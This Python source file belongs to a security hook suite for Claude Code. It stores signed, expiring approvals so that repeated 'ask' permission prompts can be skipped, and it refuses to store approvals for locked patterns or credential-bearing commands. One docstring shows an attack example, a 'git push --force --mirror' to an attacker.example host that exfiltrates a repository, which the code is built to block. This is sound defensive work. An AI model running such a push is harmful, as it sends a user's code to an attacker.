#!/usr/bin/env python3
"""Remembered approvals for ForceField ``ask`` decisions.

Claude Code gives a hook no way to learn which button the user pressed, and its
own "don't ask again" cannot silence a hook-originated ask: a PreToolUse ``ask``
is returned as the final permission decision without ``permissions.allow`` ever
being consulted. So a repeated, already-approved action re-prompts forever and
nothing in the platform settings can stop it.

This closes that gap with an explicit user action rather than an inferred one.
``/forcefield:remember`` records the approval; ``clamp_and_emit`` then waves the
next identical repeat through. Deliberately narrow:

* only ever turns ``ask`` into ``allow`` — a ``deny`` is never memoizable, so the
  zero-false-positive hard block keeps its guarantee
* exact command match, no wildcards, so one memo can only ever cover one command
* stored under ``$HOME``, never in the repo: ``<cwd>/.claude`` is untrusted by
  ``config.py``'s own model, and Bash writes to it are not guarded
* per-project and TTL-bounded by default; "global" and "forever" are opt-in
* refused for every pattern ``allowlist`` and ``exfil_guard`` already lock, and
  for any command carrying a credential
* every hit, creation, refusal and revocation is logged, and none of those
  records is subject to the ``log_level`` floor — a suppressed prompt has to
  leave more trail than an unsuppressed one, not less

Stdlib only, like every other runtime hook module. Usable as a CLI:

    python3 memo.py add --last          # remember the most recent ask
    python3 memo.py list
    python3 memo.py forget <key-prefix>
"""

from __future__ import annotations

import argparse
import contextlib
import errno
import hashlib
import hmac
import importlib
import json
import os
import re
import stat
import sys
import time
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent))
from hook_event import (  # noqa: E402
    read_regular_bytes, read_regular_tail, read_regular_text,
)
from patterns import redact_secrets  # noqa: E402
from portable_lock import FileLock  # noqa: E402

STORE_DIR = Path.home() / ".claude" / "forcefield"
STORE_PATH = STORE_DIR / "memos.json"
SECURITY_LOG = Path.home() / ".claude" / "hooks" / "security.log"

STORE_VERSION = 1
DEFAULT_TTL_DAYS = 30

# Bounds. A memo store is a hand-curated list of exceptions; anything larger is a
# mistake or an attempt to blanket-disable the guards one entry at a time.
MAX_STORE_BYTES = 262_144
MAX_MEMOS = 200
MAX_SUBJECT_CHARS = 4_096


def _collapse(subject: str) -> str:
    """Canonical form of the remembered command or path.

    Only whitespace runs are collapsed. Nothing else is normalized on purpose:
    ``normalize.py`` folds ``/usr/bin/curl``, ``./curl`` and ``'curl'`` onto one
    token, so a memo keyed on its output and created by approving the system
    binary would also match a hostile repo's local ``./curl``.
    """
    return " ".join(subject.split())


def memo_key(guard: str, pattern: str | None, subject: str, scope: str) -> str:
    """Stable id for one remembered approval.

    NUL-joined so no field can impersonate another by containing a separator.
    """
    parts = (guard, pattern or "", _collapse(subject), scope)
    return hashlib.sha256("\0".join(parts).encode("utf-8")).hexdigest()


def project_scope(cwd: str | None = None) -> str:
    """Scope token for the current project — its resolved path, or ``*``."""
    try:
        return str(Path(cwd or os.getcwd()).resolve())
    except OSError:
        return "?"


_GUARD_MODULE = re.compile(r"^[a-z][a-z0-9_]{0,63}$")


def _guard_lock_lists(guard: str) -> tuple[frozenset[str], frozenset[str]]:
    """The ``NEVER_ALLOWLIST`` / ``HARD_DENY_PATTERNS`` the guard itself declares.

    Each guard owns its own lock lists, so consulting one guard's lists on behalf
    of another answers the wrong question. Empty sets for a guard that declares
    neither; raises if the module exists but will not import, which the caller
    turns into "not memoizable".

    The name is validated and resolved against this directory before import: it
    comes from ForceField's own fixed vocabulary today, and it should stay
    impossible for it to become an arbitrary import.
    """
    if not _GUARD_MODULE.match(guard or ""):
        return (frozenset(), frozenset())
    if not (Path(__file__).parent / (guard + ".py")).is_file():
        return (frozenset(), frozenset())
    module = importlib.import_module(guard)
    return (
        frozenset(getattr(module, "NEVER_ALLOWLIST", ())),
        frozenset(getattr(module, "HARD_DENY_PATTERNS", ())),
    )


def is_memoizable(guard: str, pattern: str | None) -> tuple[bool, str]:
    """Whether this guard/pattern may be remembered at all.

    Honors the existing lock lists rather than restating them: a memo that
    ignored them would be a clean backdoor around exactly the suppressions those
    lists were written to forbid. Several ``NEVER_ALLOWLIST`` entries are only
    ask-severity, so an "asks only" memo would otherwise reach precisely them.

    Three sources, because one was not enough. Asking ``exfil_guard`` whether
    ``supply_chain_guard/pipe_to_shell`` is locked returned "no" — the pattern is
    on *supply_chain_guard's* hard-deny list, which nothing here consulted. That
    was inert only for as long as the pattern's decision stayed a deny, since a
    deny is never memoizable; the moment a lower-severity check ran first and
    turned it into an ask, the ask was memoizable and the lock was gone.

    Fails closed — if a lock list cannot be consulted, nothing is memoizable.
    """
    try:
        from allowlist import _is_never_suppressible

        if _is_never_suppressible(guard, pattern):
            return (False, f"locked: {guard}/{pattern} may never be suppressed")

        own_never, own_hard = _guard_lock_lists(guard)
        if pattern in own_never or pattern in own_hard:
            return (False, f"locked: {guard}/{pattern} is never allowlistable")

        # exfil_guard's lists stay a floor for every guard, not just its own:
        # the patterns on them describe the command, and the command does not
        # become safer for having been matched by a different guard.
        from exfil_guard import HARD_DENY_PATTERNS, NEVER_ALLOWLIST

        if pattern in NEVER_ALLOWLIST or pattern in HARD_DENY_PATTERNS:
            return (False, f"locked: {pattern} is never allowlistable")
    except Exception as exc:  # fail closed - never memoize without the lock lists
        return (False, f"lock lists unavailable ({type(exc).__name__})")
    return (True, "")


def _key_path() -> Path:
    """Sibling of the store, resolved at call time so redirecting ``STORE_DIR``
    (tests, a non-default HOME) moves the key with it."""
    return STORE_DIR / "memo.key"


def _lock_path() -> Path:
    return STORE_DIR / "memos.lock"


def _open_private(path: Path, flags: int) -> int:
    """Open ``path`` with 0600 from the moment it is created, not after.

    ``os.chmod`` after the write leaves a window in which the file exists
    world-readable; on a shared machine that window is all an attacker needs.

    ``O_BINARY`` is 0 on POSIX and is what stops the Windows CRT expanding every
    0x0A on the way out. That matters here beyond newline hygiene: this is the
    descriptor ``_store_key`` writes ``os.urandom(32)`` through, and a text-mode
    write would turn a random 32-byte key into a 32-to-40-byte one whose length
    depended on its content.

    ``O_NONBLOCK`` and the ``S_ISREG`` check are the same pair
    ``log_sinks._open_append`` and ``config._read_config`` carry, and this was
    the one ``os.open`` on the hook path without them. Every path opened here
    lives under ``$HOME``, which any same-uid process can replace, and
    ``memos.json.tmp.<pid>`` is reached from ``find_memo`` -> ``_touch`` ->
    ``_write_store`` on every gating ``ask``. Measured on both floors:
    ``O_RDWR|O_CREAT`` on a FIFO returns in 0.000 s, but
    ``O_WRONLY|O_CREAT|O_TRUNC`` waits for a reader forever -- so the lock file
    was always safe and the temp file was not. With 4000 FIFOs pre-created at
    the per-pid temp names, the hook went from ``wall=0.044s rc=0`` to
    ``wall=9.005s rc=None`` -- killed at the 5 s timeout with no verdict
    delivered.

    ``S_ISREG`` is on the DESCRIPTOR, never on a prior ``stat`` of the path,
    which races. Raising ``OSError`` is what every caller here already handles:
    ``_touch`` catches it and the memo is simply not refreshed, which is the
    fail-open direction.
    """
    flags |= getattr(os, "O_BINARY", 0) | getattr(os, "O_NONBLOCK", 0)
    descriptor = os.open(str(path), flags, 0o600)
    try:
        if not stat.S_ISREG(os.fstat(descriptor).st_mode):
            raise OSError(errno.EINVAL, "not a regular file", str(path))
    except BaseException:
        os.close(descriptor)
        raise
    return descriptor


def _ensure_store_dir() -> None:
    """Create the memo directory owner-only, and correct it if it is not.

    ``memo.key`` was already 0600, but it sat in a 0755 directory — so another
    account on the machine could traverse in, and the MAC that the whole store's
    integrity rests on could simply be replaced with one the attacker knew. A
    signature is worth exactly what the key's confidentiality is worth.

    This raises the bar to same-user; it does not eliminate the threat. Anything
    running as this user can still read the key, and no Bash guard covers writes
    inside ``$HOME``. The MAC stops a hand-written memo, not a determined local
    process running as you.
    """
    STORE_DIR.mkdir(parents=True, exist_ok=True)
    try:
        os.chmod(str(STORE_DIR), 0o700)
    except OSError:
        pass


def _log_key_distrusted(path: Path) -> None:
    """Record that the memo key was ignored because its permissions changed.

    Every memo silently ceasing to apply is exactly the kind of change a user
    experiences as "ForceField started asking again for no reason", so it leaves
    a trail. Best-effort: logging must never be what stops a tool call.
    """
    try:
        from hook_logging import defer_log

        info = path.stat()
        defer_log(
            "memo", "warn",
            pattern_matched="key_not_private",
            file_path=str(path),
            extra={
                "reason": "memo key is not owner-only; every memo now fails "
                          "verification and will prompt",
                "mode": oct(info.st_mode & 0o777),
                "owner_uid": info.st_uid,
            },
        )
    except Exception:  # noqa: BLE001 - never let logging break a memo lookup
        pass


def _key_is_private(path: Path) -> bool:
    """Whether the key file is owned by us and readable by nobody else.

    The MAC is worth exactly what the key's confidentiality is worth, so a key
    that has become group- or world-accessible — or that another account now owns
    — is not evidence of anything and must not be treated as though it were.

    This does not *prevent* a same-user process from reading or replacing the key;
    nothing here can. It makes the weakened state detectable, and turns it into a
    prompt instead of a silent allow. Failing closed here costs the user an extra
    confirmation; failing open costs them the guarantee.

    ``os.getuid`` is POSIX-only. Where it does not exist there is no owner or
    permission-bit check to make, so the answer is False — the memo does not
    apply and the user is prompted — rather than an ``AttributeError`` escaping
    ``_store_key``'s ``except OSError`` or, worse, an unverified apply.
    """
    getuid = getattr(os, "getuid", None)
    if getuid is None:
        return False
    try:
        info = path.stat()
    except OSError:
        return False
    return info.st_uid == getuid() and not (info.st_mode & 0o077)


def _store_key() -> bytes | None:
    """The HMAC key for this store, creating it on first use. None on failure.

    Returning None makes every memo fail verification, which means "prompt the
    user" — the safe direction. The key never leaves ``$HOME`` and is 0600.
    """
    try:
        _ensure_store_dir()
        key_path = _key_path()
        if key_path.is_file():
            if not _key_is_private(key_path):
                _log_key_distrusted(key_path)
                return None
            # `read_regular_bytes`, not `read_bytes`: `is_file()` answers about
            # the path and the read then gets a descriptor, so a same-uid process
            # can swap a FIFO in between and `open()` waits for a writer with no
            # deadline. 64 rather than 32, so a key file that is too long is
            # visibly too long rather than silently truncated to a valid length.
            key = read_regular_bytes(key_path, 64)
            return key if len(key) == 32 else None
        key = os.urandom(32)
        fd = _open_private(key_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL)
        try:
            os.write(fd, key)
        finally:
            os.close(fd)
        return key
    except FileExistsError:
        key = read_regular_bytes(_key_path(), 64)
        return key if len(key) == 32 else None
    except OSError:
        return None


def _signed_fields(memo: dict[str, Any]) -> bytes:
    """The part of a memo the MAC covers.

    Everything that decides whether the memo *applies* and for how long. The
    ``uses``/``last_used_at`` counters are deliberately excluded so recording a
    hit does not require re-signing — tampering with a counter grants nothing.
    """
    payload = {
        field: memo.get(field)
        for field in ("key", "guard", "pattern", "command", "scope",
                      "created_at", "expires_at")
    }
    return json.dumps(payload, sort_keys=True, separators=(",", ":")).encode("utf-8")


def _sign(memo: dict[str, Any]) -> str:
    key = _store_key()
    if key is None:
        return ""
    return hmac.new(key, _signed_fields(memo), hashlib.sha256).hexdigest()


def _verify(memo: dict[str, Any], slot: str) -> bool:
    """Whether this memo was written by ``remember`` and belongs in ``slot``.

    Every field of a memo key is public and derivable, so without a MAC the
    store is trivially forgeable: dropping a hand-written entry into
    ``memos.json`` converted a guard's ask into a silent allow. The store lives
    in ``$HOME``, which no Bash-path guard covers, so "only we can write it" was
    never true.

    The ``slot`` argument is the other half, and it is not optional. A MAC over a
    memo's own fields proves only "ForceField signed this memo" — never "this
    memo authorises the command we are about to run". Because ``find_memo``
    retrieves by dict slot, a genuinely-signed memo re-filed under a different
    slot verified happily and approved a command nobody had ever approved:

        stored : git push --force origin main            (legitimately signed)
        filed under the slot of
                 git push --force --mirror git@attacker.example:steal.git
        result : verified, and the attacker's push was waved through

    Textbook key substitution. Binding the signature to the lookup key closes it
    two ways: the memo must claim this slot, and its own signed contents must
    actually derive that slot — so the ``key`` field cannot be edited to match
    either, because it is itself covered by the MAC.
    """
    expected = _sign(memo)
    got = memo.get("mac")
    if not expected or not isinstance(got, str):
        return False
    if not hmac.compare_digest(expected, got):
        return False
    if memo.get("key") != slot:
        return False
    derived = memo_key(
        memo.get("guard") or "",
        memo.get("pattern"),
        memo.get("command") or "",
        memo.get("scope") or "",
    )
    return hmac.compare_digest(derived, slot)


def _log_memo_event(decision: str, pattern: str, **extra: Any) -> None:
    """Record one memo lifecycle event. Best effort, and never level-floored.

    The contract is that every memo path leaves a trail -- a creation, a refusal
    and a revocation are each evidence of what the suppression layer was asked to
    do. There is no flag to pass any more: ``memo`` is in
    ``hook_logging._UNSUPPRESSIBLE_GUARDS``, so "the suppression machinery is not
    suppressible" is a property of the guard rather than of remembering to set
    ``force=True`` at each call site.
    """
    try:
        from hook_logging import defer_log

        defer_log("memo", decision, pattern_matched=pattern,
                  extra=extra)
    except Exception:  # noqa: BLE001 - logging must never break a memo path
        pass


@contextlib.contextmanager
def _store_lock(blocking: bool = True):
    """Hold an exclusive lock across a whole read-modify-write.

    Without it the sequence read -> mutate -> write is three operations on one
    object, which admits the lost-update anomaly: a concurrent ``_touch`` (which
    runs on the *read* path, from ``find_memo``) could write back a pre-``forget``
    snapshot and resurrect a memo the user had just revoked. Yields None if the
    lock cannot be taken, and callers proceed — a memo must never block a call.
    """
    handle = None
    lock = None
    try:
        _ensure_store_dir()
        handle = os.fdopen(_open_private(_lock_path(), os.O_RDWR | os.O_CREAT), "r+b")
        # ``blocking=False`` is what makes the docstring's promise true on the
        # read path: a single non-blocking attempt, and the caller proceeds
        # unlocked rather than waiting. The blocking path now carries a deadline
        # too -- an unbounded wait could sit past the 5s hook timeout, be killed
        # with its verdict undelivered, and take another guard's hard deny with
        # it. ``FileLock`` never raises, so a failed acquisition is a False, and
        # the yield below is unchanged either way.
        lock = FileLock(handle, timeout=1.0 if blocking else 0)
        if not lock.acquire():
            handle.close()
            handle = None
            lock = None
    except OSError:
        if handle is not None:
            handle.close()
        handle = None
        lock = None
    try:
        yield handle
    finally:
        if handle is not None:
            try:
                if lock is not None:
                    lock.release()
            finally:
                handle.close()


def _read_store() -> dict[str, Any]:
    """Load the memo store, or an empty one. Never raises.

    The `is_file()` + `stat()` pre-check that used to guard the read was a TOCTOU
    window and not a bound: it answers about the path, while the read gets a
    descriptor. `read_regular_text` checks `S_ISREG` on the descriptor itself and
    bounds the read at `MAX_STORE_BYTES` rather than checking a size that can
    change in between.
    """
    raw = read_regular_text(STORE_PATH, MAX_STORE_BYTES)
    if not raw:
        return {"version": STORE_VERSION, "memos": {}}
    try:
        data = json.loads(raw)
    except ValueError:
        return {"version": STORE_VERSION, "memos": {}}
    if not isinstance(data, dict) or not isinstance(data.get("memos"), dict):
        return {"version": STORE_VERSION, "memos": {}}
    return data


def _write_store(data: dict[str, Any]) -> None:
    _ensure_store_dir()
    # Per-process temp name: one fixed name meant every concurrent writer opened
    # and truncated the same file.
    tmp = STORE_PATH.with_suffix(".json.tmp.%d" % os.getpid())
    fd = _open_private(tmp, os.O_WRONLY | os.O_CREAT | os.O_TRUNC)
    try:
        os.write(fd, json.dumps(data, indent=2, sort_keys=True).encode("utf-8"))
    finally:
        os.close(fd)
    os.replace(tmp, STORE_PATH)


def find_memo(
    guard: str, pattern: str | None, subject: str, cwd: str | None = None,
) -> dict[str, Any] | None:
    """A live remembered approval for this exact ask, or None.

    Checked against the project scope first, then a global memo. Expired entries
    are ignored (and swept on the next write). Never raises: any failure here
    must fall back to prompting, which is the safe direction.
    """
    try:
        if not subject or len(subject) > MAX_SUBJECT_CHARS:
            return None
        allowed, _ = is_memoizable(guard, pattern)
        if not allowed:
            return None
        store = _read_store()
        now = time.time()
        for scope in (project_scope(cwd), "*"):
            key = memo_key(guard, pattern, subject, scope)
            memo = store["memos"].get(key)
            if memo is None:
                continue
            if not _verify(memo, key):
                continue
            expires = memo.get("expires_at")
            if expires is not None and expires < now:
                continue
            _touch(key, now)
            return memo
    except Exception:  # noqa: BLE001 - a broken memo store must not block a call
        return None
    return None


def _touch(key: str, now: float) -> None:
    """Record that a memo was used. Best effort — a hit must not fail on I/O.

    Takes the lock and re-reads, then updates only if the entry is *still*
    present. The previous version wrote back the whole snapshot it had read
    before the caller made its decision, so a ``forget`` landing in that window
    was silently undone and the revoked memo came back. A lost ``uses``
    increment is acceptable; a lost revocation is not.
    """
    try:
        with _store_lock(blocking=False) as held:
            if held is None:
                return  # contended: a lost `uses` increment beats a stalled hook
            store = _read_store()
            memo = store["memos"].get(key)
            if memo is None:
                return
            memo["uses"] = int(memo.get("uses", 0)) + 1
            memo["last_used_at"] = now
            _write_store(store)
    except (OSError, ValueError, TypeError):
        pass


def remember(
    guard: str,
    pattern: str | None,
    subject: str,
    *,
    cwd: str | None = None,
    ttl_days: int | None = DEFAULT_TTL_DAYS,
    global_scope: bool = False,
) -> dict[str, Any]:
    """Record an approval. Raises ValueError with a usable message if refused."""
    subject = subject.strip()
    if not subject:
        raise ValueError("nothing to remember: empty command")
    if len(subject) > MAX_SUBJECT_CHARS:
        raise ValueError(
            f"command is too long to remember ({len(subject)} chars, "
            f"max {MAX_SUBJECT_CHARS})"
        )
    _, had_secret = redact_secrets(subject)
    if had_secret:
        _log_memo_event("warn", "memo_refused_credential", memo_guard=guard,
                        memo_pattern=pattern or "")
        raise ValueError(
            "refusing to remember a command containing a credential — rotate it "
            "and pass the secret through an environment variable instead"
        )
    allowed, why = is_memoizable(guard, pattern)
    if not allowed:
        _log_memo_event("warn", "memo_refused_locked", memo_guard=guard,
                        memo_pattern=pattern or "", reason=why)
        raise ValueError(f"refusing to remember: {why}")

    with _store_lock():
        store = _read_store()
        _sweep(store)
        if len(store["memos"]) >= MAX_MEMOS:
            raise ValueError(
                f"memo store is full ({MAX_MEMOS} entries). Run "
                f"`memo.py forget --expired`, or reconsider whether a config change "
                f"fits better than {MAX_MEMOS} one-off exceptions."
            )

        scope = "*" if global_scope else project_scope(cwd)
        now = time.time()
        memo = {
            "key": memo_key(guard, pattern, subject, scope),
            "guard": guard,
            "pattern": pattern,
            "command": _collapse(subject),
            "scope": scope,
            "created_at": now,
            "expires_at": None if ttl_days is None else now + ttl_days * 86_400,
            "uses": 0,
        }
        memo["mac"] = _sign(memo)
        if not memo["mac"]:
            raise ValueError(
                "cannot sign the memo store (unable to create "
                f"{_key_path()}) — refusing to write an unverifiable approval"
            )
        store["memos"][memo["key"]] = memo
        store["version"] = STORE_VERSION
        _write_store(store)
    _log_memo_event("warn", "memo_created", memo_guard=guard,
                    memo_pattern=pattern or "", memo_key=memo["key"][:12],
                    scope=scope, expires_at=memo["expires_at"],
                    command=_collapse(subject))
    return memo


def _sweep(store: dict[str, Any]) -> int:
    """Drop expired memos in place. Returns how many went."""
    now = time.time()
    stale = [
        key for key, memo in store["memos"].items()
        if memo.get("expires_at") is not None and memo["expires_at"] < now
    ]
    for key in stale:
        del store["memos"][key]
    return len(stale)


def entries() -> list[dict[str, Any]]:
    store = _read_store()
    return sorted(store["memos"].values(), key=lambda m: m.get("created_at", 0))


def forget(prefix: str) -> int:
    """Remove memos whose key starts with ``prefix``. Returns how many."""
    with _store_lock():
        store = _read_store()
        doomed = [key for key in store["memos"] if key.startswith(prefix)]
        for key in doomed:
            del store["memos"][key]
        if doomed:
            _write_store(store)
    if doomed:
        _log_memo_event("warn", "memo_forgotten", count=len(doomed),
                        memo_key=prefix[:12])
    return len(doomed)


def forget_expired() -> int:
    """Sweep expired memos. Returns how many went.

    Takes ``_store_lock`` for the same reason ``forget`` and ``_touch`` do: this
    is a read-modify-write over a file other processes are also writing, and
    doing it unlocked admits the lost-update anomaly the lock was introduced to
    fix. It was the one sweep site still running outside the lock, so a
    concurrent ``remember`` landing mid-sweep could be written straight back out
    of existence.
    """
    with _store_lock():
        store = _read_store()
        gone = _sweep(store)
        if gone:
            _write_store(store)
    return gone


def last_ask() -> dict[str, Any] | None:
    """The most recent ``ask`` in the security log, as (guard, pattern, subject).

    Reads the tail so a 5 MB log costs nothing. A record whose command was
    redacted is skipped: its stored text is a mask, not the real command, so a
    memo built from it could never match — and a command carrying a credential
    is not one to wave through anyway.

    The tail read goes through ``read_regular_tail`` — ``O_NONBLOCK`` plus
    ``S_ISREG`` on the descriptor — because the log path is one any same-uid
    process can replace, and ``open()`` on a FIFO there would hang this command
    with no deadline.
    """
    lines = read_regular_tail(SECURITY_LOG, 512_000).decode(
        "utf-8", "replace").splitlines()
    if not lines:
        return None
    for line in reversed(lines):
        try:
            attrs = json.loads(line)["Attributes"]
        except (ValueError, KeyError, TypeError):
            continue
        if attrs.get("forcefield.decision") != "ask":
            continue
        if attrs.get("forcefield.redacted_fields"):
            continue
        subject = attrs.get("command.line") or attrs.get("file.path")
        if not subject:
            continue
        return {
            "guard": attrs.get("forcefield.guard", ""),
            "pattern": attrs.get("forcefield.pattern"),
            "subject": subject,
        }
    return None


def _cmd_add(args: argparse.Namespace) -> int:
    if args.last:
        found = last_ask()
        if found is None:
            print("No recent ask found in the security log to remember.")
            return 1
        guard, pattern, subject = found["guard"], found["pattern"], found["subject"]
    else:
        guard, pattern, subject = args.guard, args.pattern, args.command
        if not guard or not subject:
            print("Need --guard and --command (or --last).")
            return 2
    try:
        memo = remember(
            guard, pattern, subject,
            ttl_days=None if args.forever else args.days,
            global_scope=args.global_scope,
        )
    except ValueError as exc:
        print(f"Refused: {exc}")
        return 1
    horizon = ("never expires" if memo["expires_at"] is None
               else f"expires in {args.days} days")
    where = "every project" if memo["scope"] == "*" else memo["scope"]
    key = memo["key"][:12]
    print(f"Remembered ({horizon}, {where}):")
    print(f"  guard   : {guard}{'/' + pattern if pattern else ''}")
    print(f"  command : {memo['command']}")
    print(f"  key     : {key}")
    print("\nForceField will not ask about this exact command again. "
          f"Undo with: memo.py forget {key}")
    return 0


def _cmd_list(_args: argparse.Namespace) -> int:
    rows = entries()
    if not rows:
        print("No remembered approvals.")
        return 0
    now = time.time()
    for memo in rows:
        if memo.get("expires_at") is None:
            left = "never expires"
        else:
            left = f"{max(0, (memo['expires_at'] - now) / 86_400):.0f}d left"
        scope = "global" if memo.get("scope") == "*" else Path(memo["scope"]).name
        uses = memo.get("uses", 0)
        print(f"{memo['key'][:12]}  {memo.get('guard', ''):<26} {scope:<8} "
              f"{left:<14} uses={uses:<4} {memo.get('command', '')[:60]}")
    return 0


def _cmd_forget(args: argparse.Namespace) -> int:
    if args.expired:
        print(f"Forgot {forget_expired()} expired memo(s).")
        return 0
    if not args.prefix:
        print("Give a key prefix, or --expired.")
        return 2
    gone = forget(args.prefix)
    print(f"Forgot {gone} memo(s).")
    return 0 if gone else 1


def main() -> int:
    parser = argparse.ArgumentParser(
        prog="memo.py", description="Remembered approvals for ForceField asks.",
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    add = sub.add_parser("add", help="remember an approval")
    add.add_argument("--last", action="store_true",
                     help="remember the most recent ask from the security log")
    add.add_argument("--guard")
    add.add_argument("--pattern")
    add.add_argument("--command")
    add.add_argument("--days", type=int, default=DEFAULT_TTL_DAYS)
    add.add_argument("--forever", action="store_true",
                     help="no expiry (discouraged)")
    add.add_argument("--global", dest="global_scope", action="store_true",
                     help="apply in every project, not just this one")
    add.set_defaults(func=_cmd_add)

    lst = sub.add_parser("list", help="show remembered approvals")
    lst.set_defaults(func=_cmd_list)

    fgt = sub.add_parser("forget", help="remove remembered approvals")
    fgt.add_argument("prefix", nargs="?")
    fgt.add_argument("--expired", action="store_true")
    fgt.set_defaults(func=_cmd_forget)

    args = parser.parse_args()
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
